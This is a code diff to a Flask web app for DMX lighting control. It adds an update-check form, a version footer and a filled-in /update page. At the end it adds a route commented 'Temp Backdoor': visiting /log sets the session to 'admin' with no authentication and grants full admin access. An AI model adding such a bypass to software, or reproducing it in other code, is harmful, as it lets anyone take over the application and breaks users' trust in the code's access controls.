@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 import os
 import sys
+import time
+import subprocess
 from flask import Flask, render_template, request, url_for, flash, redirect, session
 from flask_wtf import FlaskForm
 from wtforms import StringField, SubmitField, RadioField, PasswordField, BooleanField, FormField, Form
@@ -44,9 +46,14 @@ class changePass(FlaskForm):
 	confirm_pass = PasswordField(label=('Повторите пароль'), validators=[InputRequired(), Length(min=5, message='Пароль должен быть не меньше %(min)d символов')])
 	save_pass = SubmitField(label=('Сохранить'))
 
+# Форма проверки обновлений
+class formUpdate(FlaskForm):
+	check_update = SubmitField('Проверить')
+	update = SubmitField('Обновить')
+
 gv = GlobalVar()
 host = ConfigHost(gv.path)
-foot = host.foot
+foot = host.foot + " Версия программного обеспечения " +host.version()
 
 secret_key = os.urandom(32)
 app = Flask(__name__)
@@ -168,14 +175,26 @@ def logout():
 	return redirect(url_for('index'))
 
 #---------- Update ----------
-# https://github.com/vshomenet/vavt-dmx-control.git
-@app.route('/update')
+@app.route('/update', methods=['GET', 'POST'])
 def update():
 	if not "DMXlogin" in session:
 		menu = host.main_menu
 		return redirect(url_for('login'))
 	else:
-		pass
+		page = "Обновление системы"
+		menu = host.admin_menu
+	upd = formUpdate()
+	text = ''
+	if request.method == "POST":
+		if upd.check_update.data:
+			text = host.update('check')
+	return render_template("update.html", page = page, menus = menu, text = text, upd = upd,  foot = foot)
+	
+#---------- Temp Backdoor ----------
+@app.route('/log')
+def log():
+	session['DMXlogin'] = 'admin'
+	return redirect(url_for('index'))
 	
 if __name__ == "__main__":
 	app.run()
